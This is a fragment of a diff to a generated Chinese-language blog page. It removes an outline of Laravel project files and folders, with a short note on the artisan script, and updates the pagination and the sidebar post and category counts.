-<h3 id="tests-文件夹-自动测试"><a href="#tests-文件夹-自动测试" class="headerlink" title="tests 文件夹 自动测试"></a>tests 文件夹 自动测试</h3><h3 id="vendor-文件夹-包含composer依赖"><a href="#vendor-文件夹-包含composer依赖" class="headerlink" title="vendor 文件夹 包含composer依赖"></a>vendor 文件夹 包含composer依赖</h3><h3 id="editorconfig"><a href="#editorconfig" class="headerlink" title=".editorconfig"></a>.editorconfig</h3><h3 id="env"><a href="#env" class="headerlink" title=".env"></a>.env</h3><h3 id="gitattributes"><a href="#gitattributes" class="headerlink" title=".gitattributes"></a>.gitattributes</h3><h3 id="gitgnore"><a href="#gitgnore" class="headerlink" title=".gitgnore"></a>.gitgnore</h3><h3 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h3><h3 id="artisan-工匠-php文件"><a href="#artisan-工匠-php文件" class="headerlink" title="artisan(工匠)php文件"></a>artisan(工匠)php文件</h3><blockquote>
-<p> laravel支持的自动化脚本命令环境,主要作用是自动搭建很多程序框架,只能在laravel根目录使用,因为本文件在根目录</p>
-</blockquote>
-<h3 id="composer-json"><a href="#composer-json" class="headerlink" title="composer.json"></a>composer.json</h3><h3 id="compose-lock"><a href="#compose-lock" class="headerlink" title="compose.lock"></a>compose.lock</h3><h3 id="nginx-htaccess"><a href="#nginx-htaccess" class="headerlink" title="nginx.htaccess"></a>nginx.htaccess</h3><h3 id="package-json"><a href="#package-json" class="headerlink" title="package.json"></a>package.json</h3><h3 id="phpunit-xml"><a href="#phpunit-xml" class="headerlink" title="phpunit.xml"></a>phpunit.xml</h3><h3 id="readme-md"><a href="#readme-md" class="headerlink" title="readme.md"></a>readme.md</h3><h3 id="server-php"><a href="#server-php" class="headerlink" title="server.php"></a>server.php</h3><h3 id="webpack-mix-js"><a href="#webpack-mix-js" class="headerlink" title="webpack.mix.js"></a>webpack.mix.js</h3>
+
       
     </div>
 
@@ -389,7 +275,7 @@
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/9/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/9/">9</a><span class="page-number current">10</span><a class="page-number" href="/page/11/">11</a><a class="extend next" rel="next" href="/page/11/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
+    <a class="extend prev" rel="prev" href="/page/9/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/9/">9</a><span class="page-number current">10</span><a class="page-number" href="/page/11/">11</a><a class="page-number" href="/page/12/">12</a><a class="extend next" rel="next" href="/page/11/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
   </nav>
 
 
@@ -455,14 +341,14 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">11</span>
+          <span class="site-state-item-count">12</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-count">6</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
